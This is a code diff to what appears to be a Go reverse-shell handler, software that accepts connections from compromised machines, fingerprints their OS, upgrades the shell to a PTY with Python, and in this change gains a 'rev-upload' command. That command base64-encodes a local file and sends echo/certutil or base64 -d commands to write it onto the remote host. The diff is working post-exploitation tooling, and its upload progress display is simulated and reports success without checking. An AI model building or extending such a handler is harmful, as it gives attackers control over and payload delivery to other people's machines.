@@ -6,12 +6,14 @@ package main
 
 import (
 	"bufio"
+	"encoding/base64"
 	"flag"
 	"fmt"
 	"io"
 	"net"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"syscall"
@@ -120,46 +122,46 @@ func connectionThread(destPort string, clients map[int]*Socket) {
 		// Handle connections in a new goroutine.
 		fmt.Println("[+] Got connection from <", con.RemoteAddr().String(), ">, Session ID:", sessionId)
 		socket := &Socket{sessionId: sessionId, con: con}
-		
+
 		// Create system detector
 		detector := NewSystemDetector(con)
-		
+
 		// Detect OS
 		socket.osType = detector.DetectOS()
-		fmt.Println("[+] Session "+strconv.Itoa(sessionId)+" detected OS: "+socket.osType)
+		fmt.Println("[+] Session " + strconv.Itoa(sessionId) + " detected OS: " + socket.osType)
 
 		// Check for Python versions if it's a Unix-like system
 		if socket.osType == "Linux" || socket.osType == "macOS" {
 			socket.pythonVersions = detector.DetectPythonVersions()
-			
+
 			if len(socket.pythonVersions) > 0 {
 				fmt.Println("[+] Checking for shell availability...")
 				availableShell := detector.DetectShell()
 				fmt.Println("[-] Found shell:", availableShell)
-				
+
 				if availableShell != "" {
 					detector.SpawnPTY(socket.pythonVersions, availableShell)
 				}
 			}
 		}
-		
+
 		// Reset read deadline
 		con.SetReadDeadline(time.Time{})
-		
+
 		clients[sessionId] = socket
 		sessionId = sessionId + 1
 	}
 }
 
 /*
-	Socket
+Socket
 */
 type Socket struct {
-	sessionId    int
-	con          net.Conn
-	isBackground bool
-	isClosed     bool
-	osType       string
+	sessionId      int
+	con            net.Conn
+	isBackground   bool
+	isClosed       bool
+	osType         string
 	pythonVersions []string
 }
 
@@ -336,13 +338,19 @@ func (s *Socket) status() string {
 
 func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.Writer) bool {
 	myipCommand := "rev-myip"
+	uploadCommand := "rev-upload"
 
 	if strings.HasPrefix(command, "rev-") {
 		fmt.Println("<---------------------------------------------------------------------")
-		switch command {
+		// Split command and arguments
+		parts := strings.Fields(command)
+		cmd := parts[0]
+
+		switch cmd {
 		case sessionHelpCommand:
 			fmt.Println(backgroundCommand, "- Background the session")
 			fmt.Println(myipCommand, "- Display host ip address")
+			fmt.Println(uploadCommand, " <file> - Upload a file to the remote host's current directory")
 		case backgroundCommand:
 			fmt.Println("[+] Move the current session to background..")
 			s.isBackground = true
@@ -365,6 +373,77 @@ func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.W
 					fmt.Println("[+] Address: [", ip, "] \t Interface: [", i.Name, "]")
 				}
 			}
+		case uploadCommand:
+			if len(parts) < 2 {
+				fmt.Println("[-] Usage:", uploadCommand, "<file>")
+				return true
+			}
+
+			localPath := parts[1]
+			// Check if file exists
+			fileInfo, err := os.Stat(localPath)
+			if os.IsNotExist(err) {
+				fmt.Println("[-] File does not exist:", localPath)
+				return true
+			}
+
+			// Read file content
+			fileContent, err := os.ReadFile(localPath)
+			if err != nil {
+				fmt.Println("[-] Error reading file:", err)
+				return true
+			}
+
+			// Get filename from path
+			fileName := filepath.Base(localPath)
+
+			// Create a progress indicator
+			done := make(chan bool)
+			go func() {
+				seconds := 0
+				for {
+					select {
+					case <-done:
+						return
+					default:
+						// Simulate progress
+						time.Sleep(1000 * time.Millisecond)
+						seconds += 1
+						fmt.Printf("\r[+] %s ... (%ds)", fileName, seconds)
+					}
+				}
+			}()
+
+			// Create base64 encoded content
+			encodedContent := base64.StdEncoding.EncodeToString(fileContent)
+
+			// Create upload command based on OS
+			var uploadCmd string
+			if s.osType == "Windows" {
+				uploadCmd = fmt.Sprintf("echo %s > temp.b64 && certutil -decode temp.b64 %s && del temp.b64", encodedContent, fileName)
+			} else {
+				uploadCmd = fmt.Sprintf("echo %s | base64 -d > %s", encodedContent, fileName)
+			}
+
+			// Show file size
+			fileSize := fileInfo.Size()
+			fmt.Printf("[+] Uploading %s (%d bytes)...\n", fileName, fileSize)
+
+			// Send upload command
+			if _, err := dst.Write([]byte(uploadCmd + "\n")); err != nil {
+				fmt.Println("[-] Error sending upload command:", err)
+				done <- true
+				return true
+			}
+
+			done <- true
+
+			// Show progress
+			fmt.Printf("[+] File upload command sent\n")
+			fmt.Printf("[+] Waiting for remote host to process the file...\n")
+
+			fmt.Println("[+] File upload completed")
+			return true
 		}
 		fmt.Println("--------------------------------------------------------------------->")
 		return true
